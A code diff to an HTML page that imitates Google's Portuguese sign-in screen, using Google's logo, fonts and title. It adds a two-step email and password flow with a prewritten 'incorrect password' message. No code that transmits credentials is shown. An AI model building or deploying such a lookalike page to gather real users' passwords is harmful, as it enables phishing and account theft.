@@ -7,24 +7,34 @@
     <title>Fazer login nas Contas do Google</title>
     <!-- Incluindo a fonte Roboto oficial do Google -->
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <!-- Incluindo icones do Google (Material Symbols) -->
+    <link
+        href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200"
+        rel="stylesheet" />
     <link rel="stylesheet" href="style.css">
 </head>
 
 <body>
     <div class="container">
         <div class="login-wrapper">
-            <div class="login-box">
+            <!-- Loader -->
+            <div class="progress-bar-container" id="loader">
+                <div class="progress-bar"></div>
+            </div>
+
+            <div class="login-box" id="step-email">
                 <div class="logo">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
                 </div>
                 <h1>Fazer login</h1>
                 <h2>Use sua Conta do Google</h2>
 
-                <form action="#">
+                <form id="form-email">
                     <div class="input-form">
                         <div class="input-container">
-                            <input type="text" id="email" required placeholder=" " autocomplete="off">
+                            <input type="text" id="email" required placeholder=" " autocomplete="username" autofocus>
                             <label for="email">E-mail ou telefone</label>
+                            <div class="error-msg" id="email-error">Digite um e-mail válido.</div>
                         </div>
                         <a href="#" class="forgot-email">Esqueceu seu e-mail?</a>
                     </div>
@@ -36,6 +46,43 @@
 
                     <div class="actions">
                         <button type="button" class="btn-create">Criar conta</button>
+                        <button type="submit" class="btn-next">Avançar</button>
+                    </div>
+                </form>
+            </div>
+
+            <div class="login-box hidden" id="step-password">
+                <div class="logo">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
+                </div>
+                <h1>Bem-vindo(a)</h1>
+
+                <div class="user-badge" id="btn-back">
+                    <span class="material-symbols-outlined icon-profile">account_circle</span>
+                    <span id="user-display-email">email@gmail.com</span>
+                    <span class="material-symbols-outlined icon-arrow">expand_more</span>
+                </div>
+
+                <form id="form-password">
+                    <div class="input-form">
+                        <!-- fake input text for accessibility standard form behavior -->
+                        <input type="text" id="email-hidden" name="email" class="hidden-field" autocomplete="username">
+
+                        <div class="input-container">
+                            <input type="password" id="password" required placeholder=" "
+                                autocomplete="current-password">
+                            <label for="password">Digite sua senha</label>
+                            <div class="error-msg" id="password-error">Senha incorreta. Tente novamente.</div>
+                        </div>
+
+                        <div class="show-password">
+                            <input type="checkbox" id="show-pwd-checkbox">
+                            <label for="show-pwd-checkbox">Mostrar senha</label>
+                        </div>
+                    </div>
+
+                    <div class="actions">
+                        <a href="#" class="forgot-email">Esqueceu a senha?</a>
                         <button type="submit" class="btn-next">Avançar</button>
                     </div>
                 </form>
@@ -57,6 +104,9 @@
             </div>
         </div>
     </div>
+
+    <!-- JavaScript para a funcionalidade de transição -->
+    <script src="script.js"></script>
 </body>
 
 </html>
